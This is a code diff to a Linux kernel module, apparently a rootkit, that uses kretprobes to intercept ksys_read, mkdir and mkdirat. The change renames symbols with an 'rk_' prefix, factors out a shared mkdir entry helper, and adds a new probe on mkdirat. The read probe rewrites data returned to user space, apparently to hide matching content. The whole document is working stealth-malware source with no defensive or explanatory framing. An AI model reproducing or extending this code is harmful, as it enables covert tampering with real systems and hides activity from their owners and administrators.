@@ -79,29 +79,29 @@ static bool line_matches(struct rk_target_list *list,
 
 /* ── ksys_read interception ──────────────────────────────────── */
 
-struct read_data {
+struct rk_read_data {
 	void __user *ubuf;
 	size_t count;
 };
 
 /* ksys_read is not a syscall wrapper: args are directly in regs */
-static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
+static int rk_read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	struct read_data *data;
+	struct rk_read_data *data;
 
-	data = (struct read_data *)ri->data;
+	data = (struct rk_read_data *)ri->data;
 	data->ubuf = (void __user *)regs->si;
 	data->count = (size_t)regs->dx;
 	return 0;
 }
 
-static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
+static int rk_read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	struct read_data *data;
+	struct rk_read_data *data;
 	long total, new_total;
 	char *kbuf, *pos;
 
-	data = (struct read_data *)ri->data;
+	data = (struct rk_read_data *)ri->data;
 	total = regs_return_value(regs);
 	if (total <= 0)
 		return 0;
@@ -151,10 +151,10 @@ static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 	return 0;
 }
 
-static struct kretprobe read_probe = {
-	.handler        = read_return,
-	.entry_handler  = read_entry,
-	.data_size      = sizeof(struct read_data),
+static struct kretprobe rk_read_probe = {
+	.handler        = rk_read_return,
+	.entry_handler  = rk_read_entry,
+	.data_size      = sizeof(struct rk_read_data),
 	.maxactive      = 20,
 	.kp.symbol_name = "ksys_read",
 };
@@ -181,12 +181,10 @@ struct rk_mkdir_data {
 	bool intercepted;
 };
 
-static int rk_mkdir_entry(struct kretprobe_instance *inst,
-			   struct pt_regs *regs)
+static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
+			     const char __user *pathname)
 {
 	struct rk_mkdir_data *data;
-	struct pt_regs *uregs;
-	const char __user *pathname;
 	char buf[RK_PATH_MAX];
 	const char *base;
 	long copied;
@@ -194,11 +192,6 @@ static int rk_mkdir_entry(struct kretprobe_instance *inst,
 	data = (struct rk_mkdir_data *)inst->data;
 	data->intercepted = false;
 
-	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
-	if (!uregs)
-		return 0;
-
-	pathname = (const char __user *)uregs->di;
 	copied = strncpy_from_user(buf, pathname, sizeof(buf));
 	if (copied <= 0)
 		return 0;
@@ -216,6 +209,28 @@ static int rk_mkdir_entry(struct kretprobe_instance *inst,
 	return 0;
 }
 
+static int rk_mkdir_entry_mkdir(struct kretprobe_instance *inst,
+				struct pt_regs *regs)
+{
+	struct pt_regs *uregs;
+
+	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+	if (!uregs)
+		return 0;
+	return rk_mkdir_do_entry(inst, (const char __user *)uregs->di);
+}
+
+static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
+				  struct pt_regs *regs)
+{
+	struct pt_regs *uregs;
+
+	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+	if (!uregs)
+		return 0;
+	return rk_mkdir_do_entry(inst, (const char __user *)uregs->si);
+}
+
 static int rk_mkdir_return(struct kretprobe_instance *inst,
 			    struct pt_regs *regs)
 {
@@ -229,7 +244,15 @@ static int rk_mkdir_return(struct kretprobe_instance *inst,
 
 static struct kretprobe rk_mkdir_probe = {
 	.kp.symbol_name = "__x64_sys_mkdir",
-	.entry_handler  = rk_mkdir_entry,
+	.entry_handler  = rk_mkdir_entry_mkdir,
+	.handler        = rk_mkdir_return,
+	.data_size      = sizeof(struct rk_mkdir_data),
+	.maxactive      = 8,
+};
+
+static struct kretprobe rk_mkdirat_probe = {
+	.kp.symbol_name = "__x64_sys_mkdirat",
+	.entry_handler  = rk_mkdir_entry_mkdirat,
 	.handler        = rk_mkdir_return,
 	.data_size      = sizeof(struct rk_mkdir_data),
 	.maxactive      = 8,
@@ -243,7 +266,7 @@ static int __init rk_init(void)
 
 	spin_lock_init(&content_targets.lock);
 
-	ret = register_kretprobe(&read_probe);
+	ret = register_kretprobe(&rk_read_probe);
 	if (ret)
 		return ret;
 
@@ -251,17 +274,24 @@ static int __init rk_init(void)
 	if (ret)
 		goto fail_mkdir;
 
+	ret = register_kretprobe(&rk_mkdirat_probe);
+	if (ret)
+		goto fail_mkdirat;
+
 	return 0;
 
+fail_mkdirat:
+	unregister_kretprobe(&rk_mkdir_probe);
 fail_mkdir:
-	unregister_kretprobe(&read_probe);
+	unregister_kretprobe(&rk_read_probe);
 	return ret;
 }
 
 static void __exit rk_exit(void)
 {
+	unregister_kretprobe(&rk_mkdirat_probe);
 	unregister_kretprobe(&rk_mkdir_probe);
-	unregister_kretprobe(&read_probe);
+	unregister_kretprobe(&rk_read_probe);
 }
 
 module_init(rk_init);
